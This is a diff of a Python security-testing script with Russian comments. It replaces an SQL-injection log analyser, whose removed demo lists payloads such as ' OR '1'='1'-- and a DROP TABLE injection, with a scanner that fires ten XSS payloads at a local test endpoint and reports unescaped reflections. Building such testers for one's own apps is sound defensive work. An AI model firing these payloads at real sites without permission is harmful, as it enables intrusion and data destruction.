@@ -1,108 +1,105 @@
-import json
-from datetime import datetime
+import requests
 import os
+from datetime import datetime
+from markupsafe import escape
 
-class AnalysisAndReporting:
-    def __init__(self, log_file='scan_log.json', report_file='report.txt'):
-        self.log_file = log_file
-        self.report_file = report_file
+# Список полезных нагрузок XSS
+xss_payloads = [
+    "<script>alert('XSS')</script>",  # Простой скрипт
+    "<img src=x onerror=alert('XSS')>",  # XSS с изображением
+    "<svg/onload=alert('XSS')>",  # XSS с SVG
+    "<iframe src='javascript:alert(`XSS`);'></iframe>",  # XSS через iframe
+    "javascript:alert('XSS')",  # Вставка javascript
+    "<body onload=alert('XSS')>",  # XSS при загрузке тела страницы
+    "'\"><script>alert('XSS')</script>",  # Закрытие тегов
+    "><script>alert(1)</script>",  # Некорректные символы
+    "<marquee onstart=alert('XSS')>XSS</marquee>",  # XSS через marquee
+    "<a href='javascript:alert(1)'>Click</a>"  # XSS через ссылку
+]
 
-    def log_scan(self, url, payload, params, response):
-        
-        log_entry = {
-            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'url': url,
-            'payload': payload,
-            'params': params,
-            'status_code': response.status_code,
-            'response_length': len(response.text),
-            'is_error': response.status_code == 500 or 'error' in response.text.lower() or 'syntax' in response.text.lower(),
-            'response_snippet': response.text[:200]  # Сохраняем только первые 200 символов
-        }
-        
-        # Запись данных в лог-файл
-        try:
-            with open(self.log_file, 'a') as f:
-                f.write(json.dumps(log_entry) + '\n')
-            print(f'[LOGGED] Payload: {payload} -> Status: {response.status_code}')
-        except Exception as e:
-            print(f'[ERROR] Failed to log scan data: {e}')
+# URL для тестирования
+url = 'http://127.0.0.1:5000/xss'
 
-    def analyze_logs(self):
-        try:
-            with open(self.log_file, 'r') as f:
-                logs = [json.loads(line) for line in f.readlines()]
-        except FileNotFoundError:
-            print('[ERROR] Log file not found.')
-            return []
+# Параметры запроса (параметр 'input' используется для передачи полезных нагрузок)
+params = {
+    'input': ''
+}
 
-        vulnerabilities = []
-        for log in logs:
-            if log['is_error']:
-                vulnerabilities.append(log)
+results = []
 
-        return vulnerabilities
-
-    def generate_report(self, report_dir='отчет'):
-        
-        vulnerabilities = self.analyze_logs()
-        if not vulnerabilities:
-            print('[INFO] No vulnerabilities found.')
-            return
-
-
-        os.makedirs(report_dir, exist_ok=True)
-
-        # Формируем полный путь к файлу отчета
-        report_path = os.path.join(report_dir, self.report_file)
+def test_xss_vulnerabilities(url, params, payloads):
+    """Функция для тестирования уязвимости к XSS"""
+    for payload in payloads:
+        print(f'Testing payload: {payload}')
+        params['input'] = payload
 
         try:
-            with open(report_path, 'w') as f:
-                f.write('SQL Injection Vulnerability Report\n')
-                f.write('=' * 40 + '\n\n')
-                f.write(f'Total Vulnerabilities Found: {len(vulnerabilities)}\n\n')
-                
-                for i, vuln in enumerate(vulnerabilities, start=1):
-                    f.write(f'Vulnerability #{i}\n')
-                    f.write('-' * 40 + '\n')
-                    f.write(f"URL: {vuln['url']}\n")
-                    f.write(f"Payload: {vuln['payload']}\n")
-                    f.write(f"Parameters: {vuln['params']}\n")
-                    f.write(f"Status Code: {vuln['status_code']}\n")
-                    f.write(f"Response Snippet: {vuln['response_snippet']}\n")
-                    f.write('-' * 40 + '\n\n')
-            
-            print(f'[INFO] Report generated: {report_path}')
-        except Exception as e:
-            print(f'[ERROR] Failed to generate report: {e}')
+            response = requests.get(url, params=params)
+            is_vulnerable = False
+
+            # Проверка, экранируется ли payload
+            if payload in response.text and escape(payload) not in response.text:
+                is_vulnerable = True
+                print(f'[!] XSS vulnerability detected with payload: {payload}')
+            else:
+                print(f'[+] No obvious XSS vulnerability detected for payload: {payload}')
+
+            results.append({
+                'payload': payload,
+                'status_code': response.status_code,
+                'is_vulnerable': is_vulnerable,
+                'response_snippet': response.text[:200]  # Показать только первые 200 символов ответа
+            })
+        except requests.RequestException as e:
+            print(f'Error during request: {e}')
+            results.append({
+                'payload': payload,
+                'status_code': None,
+                'is_vulnerable': False,
+                'error': str(e)
+            })
+
+def generate_report(results, report_dir='Отчет'):
+
+    """Функция генерации отчета"""
+    if not results:
+        print('[INFO] Нет данных для анализа.')
+        return
+    
+    os.makedirs(report_dir, exist_ok=True)
+
+    report_filename = 'Уязвимости XSS.txt'
+    report_path = os.path.join(report_dir, report_filename)
+
+    # Анализ результатов
+    total_tests = len(results)
+    vulnerabilities = [r for r in results if r['is_vulnerable']]
+    total_vulnerable = len(vulnerabilities)
 
 
-# Пример использования модуля
+    try:
+        with open(report_path, 'w') as f:
+            f.write('XSS Vulnerability Testing Report\n')
+            f.write('=' * 40 + '\n')
+            f.write(f'Testing Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\n')
+            f.write(f'Total Tests Conducted: {total_tests}\n')
+            f.write(f'Total Vulnerabilities Found: {total_vulnerable}\n\n')
+
+            f.write('Detailed Vulnerability Information:\n')
+            f.write('-' * 40 + '\n')
+            for vuln in vulnerabilities:
+                f.write(f"Payload: {vuln['payload']}\n")
+                f.write(f"Status Code: {vuln['status_code']}\n")
+                f.write(f"Response Snippet: {vuln['response_snippet']}\n")
+                f.write('-' * 40 + '\n')
+
+            print(f'[INFO] Report saved to: {report_path}')
+    except Exception as e:
+        print(f'[ERROR] Error while saving the report: {e}')
+
 if __name__ == '__main__':
-    from requests.models import Response
-
-    # Пример симуляции вызовов
-    analyzer = AnalysisAndReporting()
-
-    # Пример использования модуля с поддельными ответами
-    fake_responses = [
-        {'status_code': 500, 'text': 'SQL syntax error near ...'},
-        {'status_code': 200, 'text': 'Welcome, user!'},
-        {'status_code': 500, 'text': 'Error: unexpected token in query'}
-    ]
-
-    fake_url = 'http://example.com/login'
-    fake_params = {'username': 'admin', 'password': 'password'}
-    fake_payloads = ["' OR '1'='1'--", "' UNION SELECT NULL--", "'; DROP TABLE users--"]
-
-    # Логируем и анализируем данные
-    for payload, fake_resp in zip(fake_payloads, fake_responses):
-        fake_response = Response()
-        fake_response.status_code = fake_resp['status_code']
-        fake_response._content = fake_resp['text'].encode('utf-8')
-        
-        # Логирование попытки
-        analyzer.log_scan(fake_url, payload, fake_params, fake_response)
+    # Запуск тестирования
+    test_xss_vulnerabilities(url, params, xss_payloads)
 
     # Генерация отчета
-    analyzer.generate_report()
+    generate_report(results)
